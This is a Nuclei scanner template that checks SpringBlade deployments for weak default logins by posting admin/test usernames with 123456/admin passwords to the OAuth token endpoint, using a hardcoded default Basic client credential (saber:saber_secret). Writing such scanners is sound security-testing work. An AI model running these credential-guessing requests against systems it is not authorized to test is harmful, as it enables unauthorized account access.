id: springblade-weak-password
info:
  name: SpringBlade Weak Password
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password

variables:
  r_user: |
    admin
    test
  r_password: |
    123456
    admin

http:
  - raw:
      - |
        POST /api/blade-auth/oauth/token?tenantId=000000&username={{r_user}}&password={{r_password}}&grantType=password&scope=all&type=account HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"error_code":401'
          - '未获取到请求头[Authorization]的信息'
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /api/blade-auth/oauth/token?tenantId=000000&username={{r_user}}&password={{r_password}}&grantType=password&scope=all&type=account HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"user_name":'
          - '"access_token":'
          - '"refresh_token":'
      - type: status
        status:
          - 200
